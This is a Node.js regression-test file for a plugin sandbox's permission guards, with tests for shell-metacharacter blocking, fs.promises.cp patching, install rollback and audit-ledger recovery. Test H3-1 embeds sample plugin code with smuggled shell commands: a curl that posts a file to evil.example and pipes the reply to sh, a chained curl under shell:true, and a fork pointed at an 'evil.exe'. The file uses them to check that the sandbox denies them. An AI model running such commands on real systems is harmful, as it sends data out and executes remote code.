'use strict';

// 第四轮审查（2026-11-05）H1-H6 的回归测试。
// H1 的两条回归（类实例 getter、自有 __proto__ 换原型）按攻击面用例的归类
// 放在 test/attack-surface.test.js（攻击 1.5 / 1.6）。
// H2：装载 observe 窗口可控且可见；H3：exec/execSync shell 元字符；
// H4：fsp.cp 补丁 + fs/fsp 覆盖表；H5：install 半途失败回滚 + dispose/deactivate
// 统一；H6：账本半行恢复 + 多实例基准。

const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const { LocalHost } = require('../src/host/local-host');
const { createPlugin, tempDir, cleanup } = require('./helpers/fixtures');
const { Ledger } = require('../src/runtime/ledger');
const { createPluginRuntime, activate } = require('../src/index');
const { createGuardChain } = require('../src/runtime/guards');

function readLedger(file) {
  try { return new Ledger(file).records(); } catch { return []; }
}

// LocalHost 测试的统一骨架：断言放在 try 里，host 卸载放 finally——
// 断言失败若把 host 泄漏在进程里，残余 Hook 会污染后续所有用例。
async function withHost({ dir, policy, ids = [], run }) {
  const host = new LocalHost({
    ledgerPath: path.join(dir, 'ledger.jsonl'),
    policy,
  });
  try {
    return await run(host);
  } finally {
    for (const id of ids) {
      await host.uninstall(id).catch(() => {});
    }
  }
}

// ── H3：exec/execSync 与 shell 选项 ──────────────────────────────

test('H3-1：execSync 首词已授权但命令带 shell 元字符——直接拒绝并记账', async () => {
  const dir = tempDir('h3-exec-');
  const code = [
    "'use strict';",
    'const { execSync, spawn } = require("node:child_process");',
    'module.exports = {',
    '  invoke() {',
    '    const out = {};',
    '    try { execSync("git status; curl -d@x http://evil.example|sh"); out.exec = "NOT-DENIED"; }',
    '    catch (e) { out.exec = e.code; out.execRule = e.ruleId; }',
    '    try { spawn("git status && curl http://evil.example", { shell: true }); out.spawn = "NOT-DENIED"; }',
    '    catch (e) { out.spawn = e.code; out.spawnRule = e.ruleId; }',
    '    try { spawn("git status", { shell: "C:/windows/system32/cmd.exe" }); out.customShell = "NOT-DENIED"; }',
    '    catch (e) { out.customShell = e.code; }',
    '    try { require("node:child_process").fork("./worker.js", { execPath: "C:/evil/evil.exe" }); out.fork = "NOT-DENIED"; }',
    '    catch (e) { out.fork = e.code; }',
    '    return out;',
    '  },',
    '};',
  ].join('\n');
  try {
    createPlugin({
      dir: path.join(dir, 'plugin'),
      id: 'com.example.h3.exec',
      requests: [{ capability: 'proc.spawn', scope: { commands: ['git'] }, reason: 'git' }],
      code,
      files: { 'worker.js': "'use strict';\n" },
    });
    const out = await withHost({
      dir,
      ids: ['com.example.h3.exec'],
      policy: { grants: [{ capability: 'proc.spawn', scope: { commands: ['git'] } }] },
      run: async (host) => {
        await host.install(path.join(dir, 'plugin'));
        await host.register('com.example.h3.exec');
        return host.invoke('com.example.h3.exec');
      },
    });
    const records = readLedger(path.join(dir, 'ledger.jsonl'));
    assert.equal(out.exec, 'DASHCAM_DENIED', 'execSync 的 `git;curl|sh` 必须被拒');
    assert.equal(out.execRule, 'shell_metachar');
    assert.equal(out.spawn, 'DASHCAM_DENIED', 'spawn + shell:true 的元字符命令必须被拒');
    assert.equal(out.spawnRule, 'shell_metachar');
    assert.equal(out.customShell, 'DASHCAM_DENIED', '自定义 shell 解释器必须被拒');
    assert.equal(out.fork, 'DASHCAM_DENIED', 'fork 的 execPath 错位必须被拒');
    const metacharDenies = records.filter((r) => r.ruleId === 'shell_metachar' && r.decision === 'deny');
    assert.ok(metacharDenies.length >= 2, `shell_metachar 必须记账（exec + spawn），实际 ${metacharDenies.length} 条`);
  } finally {
    cleanup(dir);
  }
});

test('H3-2：exec/execSync 无元字符时首词判定照旧工作（不破坏既有语义）', async () => {
  const dir = tempDir('h3-clean-');
  const code = [
    "'use strict';",
    'const { execSync } = require("node:child_process");',
    'module.exports = {',
    '  invoke() {',
    '    const out = {};',
    '    try { execSync("whoami"); out.whoami = "NOT-DENIED"; }',
    '    catch (e) { out.whoami = e.code; }',
    '    return out;',
    '  },',
    '};',
  ].join('\n');
  try {
    createPlugin({
      dir: path.join(dir, 'plugin'),
      id: 'com.example.h3.clean',
      requests: [{ capability: 'proc.spawn', scope: { commands: ['git'] }, reason: 'git' }],
      code,
    });
    const out = await withHost({
      dir,
      ids: ['com.example.h3.clean'],
      policy: { grants: [{ capability: 'proc.spawn', scope: { commands: ['git'] } }] },
      run: async (host) => {
        await host.install(path.join(dir, 'plugin'));
        await host.register('com.example.h3.clean');
        return host.invoke('com.example.h3.clean');
      },
    });
    // 命令本身不含元字符：走既有的首词判定——whoami 不在授权里，照常拒绝。
    assert.equal(out.whoami, 'DASHCAM_DENIED');
  } finally {
    cleanup(dir);
  }
});

// ── H4：fsp.cp 补丁 + 覆盖表 ─────────────────────────────────────

test('H4-1：fs.promises.cp 未授权时拒绝并记账，授权后放行', async () => {
  const dir = tempDir('h4-fsp-cp-');
  const code = [
    "'use strict';",
    'const fsp = require("fs").promises;',
    'const path = require("path");',
    'module.exports = {',
    '  async invoke() {',
    '    const out = {};',
    '    const src = path.join(__dirname, "data.txt");',
    '    const dest = path.join(__dirname, "copy.txt");',
    '    try { await fsp.cp(src, dest); out.attack = "NOT-DENIED"; }',
    '    catch (e) { out.attack = e.code || String(e); }',
    '    const innerSrc = path.join(__dirname, "inner");',
    '    const innerDest = path.join(__dirname, "inner-copy");',
    '    try { await fsp.cp(innerSrc, innerDest, { recursive: true }); out.granted = "ok"; }',
    '    catch (e) { out.granted = e.code || String(e); }',
    '    return out;',
    '  },',
    '};',
  ].join('\n');
  try {
    createPlugin({
      dir: path.join(dir, 'plugin'),
      id: 'com.example.h4.fspcp',
      // cp 的守卫判的是 src/dest 目录本身（guardPath('read', args[0])），
      // `inner/**` 不匹配 `inner` 目录自身——目录与递归两条都要授权。
      // 另外 Node 的 cp 实现会在**异步续体**（callDepth 已归零，判定真实发生）
      // 里 stat 目标侧：checkParentDir → pathExists 判 dest 父目录（插件根）、
      // checkPaths → getStats 判 dest 树每个条目——dest 侧的读面也必须授权，
      // 否则 fail-closed 拒绝递归拷贝。
      requests: [
        { capability: 'fs.read', scope: { paths: ['$PLUGIN', '$PLUGIN/inner', '$PLUGIN/inner/**', '$PLUGIN/inner-copy', '$PLUGIN/inner-copy/**'] }, reason: '读' },
        { capability: 'fs.write', scope: { paths: ['$PLUGIN/inner-copy', '$PLUGIN/inner-copy/**'] }, reason: '写' },
      ],
      code,
      files: { 'data.txt': 'secret\n', 'inner/nested.txt': 'nested\n' },
    });
    const out = await withHost({
      dir,
      ids: ['com.example.h4.fspcp'],
      policy: {
        grants: [
          { capability: 'fs.read', scope: { paths: ['$PLUGIN', '$PLUGIN/inner', '$PLUGIN/inner/**', '$PLUGIN/inner-copy', '$PLUGIN/inner-copy/**'] } },
          { capability: 'fs.write', scope: { paths: ['$PLUGIN/inner-copy', '$PLUGIN/inner-copy/**'] } },
        ],
      },
      run: async (host) => {
        await host.install(path.join(dir, 'plugin'));
        await host.register('com.example.h4.fspcp');
        return host.invoke('com.example.h4.fspcp');
      },
    });
    const records = readLedger(path.join(dir, 'ledger.jsonl'));
    // data.txt 不在授权的 inner/** 里：fsp.cp 必须当作读写双面越界拒绝。
    assert.equal(out.attack, 'DASHCAM_DENIED', '未授权的 fsp.cp 必须被拒');
    assert.equal(
      fs.existsSync(path.join(dir, 'plugin', 'copy.txt')), false,
      '未授权的拷贝不得落地',
    );
    assert.ok(
      records.some((r) => r.decision === 'deny' && (r.capability === 'fs.read' || r.capability === 'fs.write')),
      '账本必须出现 deny（读面或写面）',
    );
    // 授权范围内的递归拷贝照常工作（fs.cp 的既有语义在 fsp 侧不再缺位）。
    assert.equal(out.granted, 'ok');
    assert.equal(
      fs.readFileSync(path.join(dir, 'plugin', 'inner-copy', 'nested.txt'), 'utf8'),
      'nested\n',
      '授权的 fsp.cp 递归拷贝应成功',
    );
  } finally {
    cleanup(dir);
  }
});

test('H4-2：fs 与 fsp 的方法覆盖表——fs 已 patch 且 fsp 存在同名 API 时，fsp 也必须已 patch', () => {
  const guard = createGuardChain({ manifest: undefined, grants: [] });
  const hooks = guard.installNativeHooks();
  try {
    const fsModule = require('node:fs');
    const fsp = fsModule.promises;
    const fsPatched = new Set(hooks.checks.filter((c) => c.target === fsModule).map((c) => c.prop));
    const fspPatched = new Set(hooks.checks.filter((c) => c.target === fsp).map((c) => c.prop));
    assert.ok(fsPatched.size > 0, 'fs 侧必须有 patch（否则对照本身失效）');
    assert.ok(fspPatched.size > 0, 'fsp 侧必须有 patch');
    const missing = [];
    for (const method of fsPatched) {
      if (typeof fsp[method] === 'function' && !fspPatched.has(method)) {
        missing.push(`fsp.${method}`);
      }
    }
    assert.deepEqual(
      missing, [],
      `fs 已受控但 fsp 漏补丁：${missing.join(', ')}（第四轮审查 H4：fsp.cp 曾是这么漏掉的）`,
    );
  } finally {
    hooks.uninstall();
  }
});

// ── H5：install 半途失败回滚 + dispose/deactivate 统一 ───────────

test('H5-1：createPluginRuntime 半途失败（redirect 冲突）不残留 Hook，之后可再次安装', () => {
  const dir = tempDir('h5-rollback-');
  try {
    const realRead = fs.readFileSync;
    // rt1 的 manifest 授权 pluginRoot 目录：半途失败场景里第二个 runtime 的
    // statSync(pluginRoot) 会穿过 rt1 的 Hook，必须被 rt1 放行才能到达
    // redirect 冲突点（那才是要测的失败位）。同理，第二个 runtime 创建 Ledger
    // 时解析 mac 密钥会读 process.env.DSH_DASHCAM_MAC_KEY——敏感命名穿过
    // rt1 的 env Proxy 判 cred.read，这条宿主侧行为也要 rt1 放行。
    // 注意：直接调 createPluginRuntime 不经 LocalHost 的 manifest/grants
    // 规范化——`$PLUGIN` 不会被展开，因此这里用字面量绝对路径（POSIX 分隔符，
    // 与判定层 normalizePath 同口径），且目录自身与递归两条都要写。
    const root = dir.replace(/\\/g, '/');
    const manifest = {
      id: 'com.example.h5.rollback',
      version: '1.0.0',
      dashcam: { requests: [
        { capability: 'fs.read', scope: { paths: [root, `${root}/**`] } },
        { capability: 'cred.read', scope: { targets: ['env:DSH_DASHCAM_MAC_KEY'] } },
      ] },
    };
    const base = {
      manifest,
      grants: [
        { capability: 'fs.read', scope: { paths: [root, `${root}/**`] } },
        { capability: 'cred.read', scope: { targets: ['env:DSH_DASHCAM_MAC_KEY'] } },
      ],
      pluginRoot: dir,
    };
    const rt1 = createPluginRuntime({ ...base, sandbox: 'handles', ledgerPath: path.join(dir, 'l1.jsonl') });
    try {
      const afterFirst = fs.readFileSync;
      assert.notEqual(afterFirst, realRead, '第一条 runtime 应已装上 Hook');
      // redirect 冲突让第二段安装半途失败：此前它的 bridge 已经装上了。
      assert.throws(
        () => createPluginRuntime({ ...base, sandbox: 'handles', ledgerPath: path.join(dir, 'l2.jsonl') }),
        /只能启用一条模块重定向/,
      );
      assert.equal(fs.readFileSync, afterFirst, '失败的安装不得叠加自己的 Hook 层');
    } finally {
      rt1.dispose();
    }
    assert.equal(fs.readFileSync, realRead, 'dispose 后 Hook 应回到原生');
    // 失败不留残迹：下一次安装照常成功。
    const rt2 = createPluginRuntime({ ...base, sandbox: 'handles', ledgerPath: path.join(dir, 'l3.jsonl') });
    rt2.dispose();
    assert.equal(fs.readFileSync, realRead);
  } finally {
    cleanup(dir);
  }
});

test('H5-2：直接 runtime.dispose() 之后 activate 不再被互斥永久挡死，且重复释放幂等', () => {
  const dir = tempDir('h5-release-');
  const file = path.join(dir, 'probe.txt');
  fs.writeFileSync(file, 'ok');
  try {
    const manifest = {
      id: 'com.example.h5.release',
      version: '1.0.0',
      dashcam: { requests: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] } }] },
    };
    const host = {
      manifest,
      grants: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] } }],
      pluginRoot: dir,
      ledgerPath: path.join(dir, 'ledger.jsonl'),
    };
    const one = activate(host);
    try {
      assert.equal(typeof one.runtime.guard.check, 'function');
    } finally {
      // 不走 deactivate，直接 dispose：H5 之前这条路径不递减计数，
      // 下一次 activate 会抛「只能有一个活动运行时」。
      one.runtime.dispose();
    }
    // 重复释放（dispose/deactivate 各再来一次）都必须是空操作。
    one.runtime.dispose();
    one.deactivate();
    assert.equal(fs.readFileSync(file, 'utf8'), 'ok', 'Hook 卸载后 fs 回到原生');
    const two = activate(host);
    two.deactivate();
    assert.equal(fs.readFileSync(file, 'utf8'), 'ok');
  } finally {
    cleanup(dir);
  }
});

// ── H6：账本半行恢复 + 多实例共享基准 ────────────────────────────

test('H6-1：崩溃残留的半行在构造时被截断落盘，续链无损', () => {
  const dir = tempDir('h6-halfline-');
  try {
    const file = path.join(dir, 'ledger.jsonl');
    const a = new Ledger(file);
    a.append({ plugin: 'p', capability: 'fs.read', action: 'fs.read', scope: {}, decision: 'allow', ruleId: 'two-key', reason: '读取' });
    // 模拟宿主崩溃：最后一行只有半截（含多字节字符，验证按字节截断）。
    fs.appendFileSync(file, Buffer.from('{"v":2,"seq":2,"reason":"半行残骸', 'utf8'));
    const b = new Ledger(file);
    const content = fs.readFileSync(file, 'utf8');
    assert.ok(content.endsWith('\n'), '半行必须被截到最后一个换行');
    assert.ok(!content.includes('半行残骸'), '残骸不允许留在文件里');
    let verify = b.verify();
    assert.ok(verify.ok, `截断后链必须完整：${JSON.stringify(verify.errors)}`);
    const entry = b.append({ plugin: 'p', capability: 'fs.read', action: 'fs.read', scope: {}, decision: 'deny', ruleId: 'two-key', reason: '拒绝' });
    assert.equal(entry.seq, 2, '续链 seq 接在最后一条完整行之后');
    verify = b.verify();
    assert.ok(verify.ok, `续链后必须可验证：${JSON.stringify(verify.errors)}`);
  } finally {
    cleanup(dir);
  }
});

test('H6-2：多实例交替写不再误报并发，外部写入者仍被检测并告警', () => {
  const dir = tempDir('h6-multi-');
  try {
    const file = path.join(dir, 'ledger.jsonl');
    const record = { plugin: 'p', capability: 'fs.read', action: 'fs.read', scope: {}, decision: 'allow', ruleId: 'two-key', reason: 'r' };
    // 准入、注册、运行时各建一个实例（同一路径多个写者）是宿主的真实形态。
    const admission = new Ledger(file);
    admission.append(record);
    const registry = new Ledger(file);
    registry.append(record); // H6 之前：磁盘已被 admission 推进，这里误报并发
    const runtime = new Ledger(file);
    const entry = runtime.append(record);
    assert.equal(entry.seq, 3, '三实例交替写按单写者续号');
    assert.ok(runtime.verify().ok);

    // 外部写入者（绕过 Ledger 的进程/手工编辑）：append 必须报错而非吞字节。
    fs.appendFileSync(file, '{"external":true}\n');
    assert.throws(() => runtime.append(record), /并发写入/);
    assert.throws(() => admission.append(record), /并发写入/);

    // 构造新实例：对齐磁盘现状（审计要能打开账本），但外部写入必须可见。
    const warns = [];
    const originalWarn = console.warn;
    console.warn = (message) => { warns.push(String(message)); };
    let late;
    try {
      late = new Ledger(file);
    } finally {
      console.warn = originalWarn;
    }
    assert.ok(
      warns.some((message) => message.includes('Ledger 实例之外被写入')),
      `外部写入必须打告警，实际 ${JSON.stringify(warns)}`,
    );
    // 对齐是接受磁盘现状：从新基准续写，链校验由 verify 负责。
    const next = late.append(record);
    assert.ok(Number.isInteger(next.seq));
  } finally {
    cleanup(dir);
  }
});

// ── H2：装载 observe 窗口可控且可见 ──────────────────────────────

test('H2-1：默认装载窗口放行顶层越界（记账 deny+observed），装载结束打告警', async () => {
  const dir = tempDir('h2-observe-');
  const outside = path.join(dir, 'outside.txt');
  fs.writeFileSync(outside, 'outside\n');
  // 顶层（装载期）读一个未声明路径：observe 窗口应改写为放行并记账。
  const code = [
    "'use strict';",
    'const fs = require("fs");',
    `const loaded = fs.readFileSync(${JSON.stringify(outside)}, "utf8");`,
    'module.exports = { invoke: () => ({ loaded }) };',
  ].join('\n');
  try {
    createPlugin({
      dir: path.join(dir, 'plugin'),
      id: 'com.example.h2.observe',
      requests: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] }, reason: '读' }],
      code,
    });
    const warns = [];
    const originalWarn = console.warn;
    console.warn = (message) => { warns.push(String(message)); };
    let out;
    try {
      out = await withHost({
        dir,
        ids: ['com.example.h2.observe'],
        policy: { grants: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] } }] },
        run: async (host) => {
          await host.install(path.join(dir, 'plugin'));
          await host.register('com.example.h2.observe');
          return host.invoke('com.example.h2.observe');
        },
      });
    } finally {
      console.warn = originalWarn;
    }
    const records = readLedger(path.join(dir, 'ledger.jsonl'));
    assert.equal(out.loaded, 'outside\n', '默认窗口应放行装载期读取');
    // observe 窗口的契约是「照常判定、照常记账，只是不抛」：deny 以原始
    // ruleId（not_declared/scope_mismatch 等）落账，放行事实由上面 loaded 证明。
    assert.ok(
      records.some((r) => r.decision === 'deny' && r.capability === 'fs.read'),
      `装载期越界必须按 deny 记账，实际 ${JSON.stringify(records.map((r) => `${r.capability}:${r.decision}:${r.ruleId}`))}`,
    );
    assert.ok(
      warns.some((message) => message.includes('装载窗口') && message.includes('com.example.h2.observe')),
      `装载结束必须打告警，实际 ${JSON.stringify(warns)}`,
    );
  } finally {
    cleanup(dir);
  }
});

test('H2-2：policy.enforcement.observeLoadWindow=false——装载期越界直接拒绝（fail-closed）', async () => {
  const dir = tempDir('h2-strict-');
  const outside = path.join(dir, 'outside.txt');
  fs.writeFileSync(outside, 'outside\n');
  const code = [
    "'use strict';",
    'const fs = require("fs");',
    `fs.readFileSync(${JSON.stringify(outside)}, "utf8");`,
    'module.exports = { invoke: () => ({}) };',
  ].join('\n');
  try {
    createPlugin({
      dir: path.join(dir, 'plugin'),
      id: 'com.example.h2.strict',
      requests: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] }, reason: '读' }],
      code,
    });
    await withHost({
      dir,
      ids: ['com.example.h2.strict'],
      policy: {
        enforcement: { observeLoadWindow: false },
        grants: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] } }],
      },
      run: async (host) => {
        await host.install(path.join(dir, 'plugin'));
        await assert.rejects(
          () => host.register('com.example.h2.strict'),
          /注册失败（加载入口）|DASHCAM_DENIED/,
          '关闭窗口后装载期越界必须让注册失败',
        );
      },
    });
  } finally {
    cleanup(dir);
  }
});
